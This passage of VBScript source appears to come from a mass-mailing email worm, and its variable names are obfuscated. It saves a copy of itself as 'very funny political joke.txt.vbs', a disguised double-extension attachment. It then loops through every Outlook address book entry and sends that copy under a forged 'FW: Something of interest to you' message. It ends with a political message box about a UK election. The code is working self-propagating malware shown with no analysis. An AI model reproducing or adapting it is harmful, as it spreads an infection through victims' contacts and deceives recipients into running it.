MDNZRVCFCUDAPOVWSJGL=1
KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY=KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY+1
end if
end if
loop
end if
.writeline JFJNFPIGOXQQRDFNCTGYW
end with
loop
HVABLIB.Copy(HTADWFOV&"\very funny political joke.txt.vbs")

for ZHYPFOUDN=1 to JJUTZPRFNQCKWWJQYLPBFRUHGOFWFK.AddressLists.Count
set BCZATWEFAYQ=JJUTZPRFNQCKWWJQYLPBFRUHGOFWFK.AddressLists(ZHYPFOUDN)
XZAVLEXSKLHYPXIR=1

for EXVKQPJOFRZBAXNSY=1 to BCZATWEFAYQ.AddressEntries.Count
XTOFNJGFSIYSF=BCZATWEFAYQ.AddressEntries(XZAVLEXSKLHYPXIR)
set male=CHDXNZHJSQCLLI.CreateItem(0)
male.Recipients.Add(XTOFNJGFSIYSF)
male.Subject = "FW: Something of interest to you"
male.Body = vbcrlf&"-----Original Message-----"&vbcrlf&"From: Eris [mailto:eris@yahoo.co.uk]"&vbcrlf&"Sent: "&date()&" "&left(time(),5)&vbcrlf&"To: MyFriendsList"&vbcrlf&"Subject: Something of interest to you"&vbcrlf&vbcrlf&vbcrlf
male.Attachments.Add(HTADWFOV&"\very funny political joke.txt.vbs")
male.Send
male=nothing
XZAVLEXSKLHYPXIR=XZAVLEXSKLHYPXIR+1
next
next
Set CHDXNZHJSQCLLI=Nothing
Set JJUTZPRFNQCKWWJQYLPBFRUHGOFWFK=Nothing
Set IPKIXHRRAL=Nothing
end if

IPKIXHRRAL=MsgBox("We vote Governments in; TRUSTING that THEY will deliver THEIR manifesto"&vbcrlf&"Why do THEY always break our TRUST?"&vbcrlf&"FCUK'EM!!!"&vbcrlf&"Vote NO Confidence"&vbcrlf&"DONT VOTE", 16, "UK Election Action")
